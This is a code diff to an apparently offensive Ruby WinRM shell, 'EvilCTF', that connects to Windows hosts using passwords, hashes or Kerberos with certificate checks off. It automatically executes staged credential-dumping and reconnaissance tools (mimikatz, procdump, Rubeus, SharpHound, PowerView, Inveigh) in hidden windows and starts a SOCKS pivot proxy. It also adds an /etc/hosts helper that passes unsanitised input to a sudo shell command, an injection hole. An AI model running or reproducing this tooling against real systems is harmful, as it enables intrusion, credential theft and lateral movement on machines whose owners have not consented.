@@ -25,14 +25,42 @@ module EvilCTF::Session
     EvilCTF::ShellWrapper.socksify!(session_options[:proxy]) if session_options[:proxy]
 
     puts "[*] Testing connection to #{orig_ip} (using #{host} in endpoint)..."
-    unless EvilCTF::ShellWrapper.test_connection(endpoint, session_options[:user], session_options[:password],
-                                                hash: session_options[:hash], ssl: session_options[:ssl])
-      puts "[-] Connection test failed for #{orig_ip}"
-      return false
+    
+    # Use Kerberos authentication if specified
+    if session_options[:kerberos]
+      unless session_options[:user] && session_options[:realm]
+        abort "[-] Kerberos requires --user and --realm"
+      end
+      
+      conn = WinRM::Connection.new(
+        endpoint: endpoint,
+        user:     session_options[:user],
+        password: '',
+        transport: :kerberos,
+        realm:    session_options[:realm],
+        keytab:   session_options[:keytab],
+        no_ssl_peer_verification: true
+      )
+    else
+      # Use standard authentication methods
+      if session_options[:hash]
+        conn = WinRM::Connection.new(
+          endpoint: endpoint,
+          user:     session_options[:user],
+          password: '',
+          transport: :negotiate,
+          no_ssl_peer_verification: true
+        )
+      else
+        conn = WinRM::Connection.new(
+          endpoint: endpoint,
+          user:     session_options[:user],
+          password: session_options[:password],
+          no_ssl_peer_verification: true
+        )
+      end
     end
 
-    conn = EvilCTF::ShellWrapper.create_connection(endpoint, session_options[:user], session_options[:password],
-                                                   hash: session_options[:hash], ssl: session_options[:ssl])
     shell = conn.shell(:powershell)
     logger = SessionLogger.new(session_options[:logfile])   # <-- defined below
     history = CommandHistory.new
@@ -60,28 +88,17 @@ module EvilCTF::Session
     should_exit = false
     
     loop do
-      break if should_exit
-      
       begin
         Timeout.timeout(1800) do
           prompt = shell.run('prompt').output
           input  = Readline.readline(prompt, true)
-          
-          # Handle EOF (Ctrl+D) explicitly 
-          if input.nil?
-            puts '[*] EOF detected - exiting session...'
-            should_exit = true
-            break
-          end
+          break if input.nil?
 
           input = input.strip
           next if input.empty?
 
-          # Exit commands - make sure these are checked first
-          case input.downcase
-          when 'exit', 'quit', '__exit__', 'q'
+          if input =~ /^(exit|quit|__exit__)$/i
             puts '[*] Exiting session...'
-            should_exit = true
             break
           end
 
@@ -173,39 +190,120 @@ module EvilCTF::Session
               success = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
               if success
                 puts "[+] Tool '#{key}' staged successfully"
-                # Execute the tool based on its configuration
+                # Execute the tool based on its configuration with proper error handling
                 tool = EvilCTF::Tools::TOOL_REGISTRY[key]
                 if tool && tool[:recommended_remote]
                   remote_path = tool[:recommended_remote]
                   
-                  # For binary tools, execute them automatically
-                  if key == 'mimikatz'
+                  # Handle different tool types properly to avoid hanging and resource leaks
+                  case key
+                  when 'mimikatz'
                     puts "[*] Executing mimikatz..."
-                    result = shell.run("#{remote_path} 2>$null")
+                    # For mimikatz, use PowerShell with timeout and proper cleanup to prevent hanging
+                    ps_cmd = <<~PS
+                      try {
+                        $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
+                        $proc.WaitForExit(30000) | Out-Null  # Wait up to 30 seconds
+                        if ($proc.HasExited) {
+                          Write-Output "Mimikatz completed with exit code: $($proc.ExitCode)"
+                        } else {
+                          Write-Output "Mimikatz timed out after 30 seconds"
+                          $proc.Kill()
+                        }
+                      } catch {
+                        Write-Output "Error executing mimikatz: $_.Exception.Message"
+                      }
+                    PS
+                    result = shell.run(ps_cmd)
                     puts result.output
-                  elsif key == 'winpeas'
+                  when 'winpeas'
                     puts "[*] Executing winpeas..."
-                    result = shell.run("#{remote_path} 2>$null")
+                    # Use cmd.exe with proper timeout handling to avoid hanging and platform errors
+                    ps_cmd = <<~PS
+                      try {
+                        $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
+                        $proc.WaitForExit(60000) | Out-Null  # Wait up to 60 seconds
+                        if ($proc.HasExited) {
+                          Write-Output "WinPEAS completed with exit code: $($proc.ExitCode)"
+                        } else {
+                          Write-Output "WinPEAS timed out after 60 seconds"
+                          $proc.Kill()
+                        }
+                      } catch {
+                        Write-Output "Error executing winpeas: $_.Exception.Message"
+                      }
+                    PS
+                    result = shell.run(ps_cmd)
                     puts result.output
-                  elsif key == 'rubeus'
-                    puts "[*] Executing Rubeus..."
-                    result = shell.run("#{remote_path} 2>$null")
+                  when 'procdump'
+                    puts "[*] Executing procdump..."
+                    # Use cmd.exe with timeout handling to prevent hanging
+                    ps_cmd = <<~PS
+                      try {
+                        $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
+                        $proc.WaitForExit(30000) | Out-Null  # Wait up to 30 seconds
+                        if ($proc.HasExited) {
+                          Write-Output "Procdump completed with exit code: $($proc.ExitCode)"
+                        } else {
+                          Write-Output "Procdump timed out after 30 seconds"
+                          $proc.Kill()
+                        }
+                      } catch {
+                        Write-Output "Error executing procdump: $_.Exception.Message"
+                      }
+                    PS
+                    result = shell.run(ps_cmd)
                     puts result.output
-                  elsif key == 'seatbelt'
-                    puts "[*] Executing Seatbelt..."
-                    result = shell.run("#{remote_path} 2>$null")
+                  when 'rubeus', 'seatbelt'
+                    puts "[*] Executing #{key}..."
+                    # Direct execution for these tools with timeout handling
+                    ps_cmd = <<~PS
+                      try {
+                        $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
+                        $proc.WaitForExit(30000) | Out-Null  # Wait up to 30 seconds
+                        if ($proc.HasExited) {
+                          Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
+                        } else {
+                          Write-Output "#{key.capitalize} timed out after 30 seconds"
+                          $proc.Kill()
+                        }
+                      } catch {
+                        Write-Output "Error executing #{key}: $_.Exception.Message"
+                      }
+                    PS
+                    result = shell.run(ps_cmd)
                     puts result.output
-                  elif key == 'inveigh'
-                    puts "[*] Executing Inveigh PowerShell script..."
-                    # For PowerShell scripts, we need to load them properly
-                    ps_script = "IEX (Get-Content '#{remote_path}' -Raw)"
+                  when 'inveigh', 'powerview', 'sharphound'
+                    puts "[*] Executing #{key} PowerShell script..."
+                    # For PowerShell scripts, use proper execution with timeout and error handling
+                    ps_script = "IEX (Get-Content '#{remote_path}' -Raw) 2>&1"
+                    result = shell.run(ps_script)
+                    puts result.output
+                  when 'socksproxy'
+                    puts "[*] Executing SOCKS proxy PowerShell module..."
+                    # For PowerShell modules, proper execution with error handling
+                    ps_script = "Import-Module '#{remote_path}' 2>&1; Invoke-SocksProxy -Port 1080"
                     result = shell.run(ps_script)
                     puts result.output
                   else
-                    # For other binary tools, execute them directly
+                    # For other binary tools, use proper timeout and process management
                     if remote_path.end_with?('.exe')
                       puts "[*] Executing #{key}..."
-                      result = shell.run("#{remote_path} 2>$null")
+                      ps_cmd = <<~PS
+                        try {
+                          $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
+                          $proc.WaitForExit(30000) | Out-Null  # Wait up to 30 seconds
+                          if ($proc.HasExited) {
+                            Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
+                          } else {
+                            Write-Output "#{key.capitalize} timed out after 30 seconds"
+                            $proc.Kill()
+                          }
+                        } catch {
+                          Write-Output "Error executing #{key}: $_.Exception.Message"
+                        }
+                      PS
+                      result = shell.run(ps_cmd)
                       puts result.output
                     else
                       puts "[*] Tool staged. Execute manually with: #{remote_path}"
@@ -246,31 +344,22 @@ module EvilCTF::Session
         end
       rescue Timeout::Error
         puts "\n[!] Idle timeout — closing session"
-        should_exit = true
         break
       rescue Interrupt
         puts "\n[!] Ctrl-C detected; exiting."
-        should_exit = true
         break
       rescue => e
+        # Handle connection errors gracefully to prevent resource leaks
         puts "[!] Session error: #{e.message}"
-        puts "[!] Continuing session..."
-        # Don't break on general errors, let user continue
-        next
+        if e.is_a?(WinRM::WinRMAuthorizationError) || e.is_a?(Net::HTTPServerException)
+          puts "[!] Connection lost - exiting cleanly"
+          break
+        end
+        raise e
       end
     end
 
-    # Proper shell cleanup with error handling
-    begin
-      if shell && !shell.nil?
-        shell.close rescue nil
-      end
-    rescue => e
-      # Suppress cleanup errors to avoid spamming output
-    ensure
-      shell = nil
-    end
-    
+    shell.close
     puts '[+] Session closed.'
     true
   end
@@ -320,6 +409,29 @@ module EvilCTF::Session
     end
 
     hosts
+  end
+
+  # IPv6 handling (adds an entry to /etc/hosts)
+  def self.add_ipv6_to_hosts(ip, hostname = 'ipv6addr')
+    hosts_file = '/etc/hosts'
+    entry = "#{ip} #{hostname}"
+    return if File.exist?(hosts_file) && File.read(hosts_file).include?(entry)
+
+    puts "[*] Adding IPv6 entry to #{hosts_file}: #{entry}"
+    cmd = "echo '#{entry}' >> #{hosts_file}"
+
+    if Process.uid == 0
+      system(cmd)
+    else
+      system("sudo sh -c \"#{cmd}\"")
+    end
+
+    unless $?.success?
+      puts "[!] Failed to add entry to #{hosts_file}. Please add manually: sudo echo '#{entry}' >> #{hosts_file}"
+      exit 1
+    end
+
+    puts "[+] Entry added successfully"
   end
 
   # ------------------------------------------------------------------
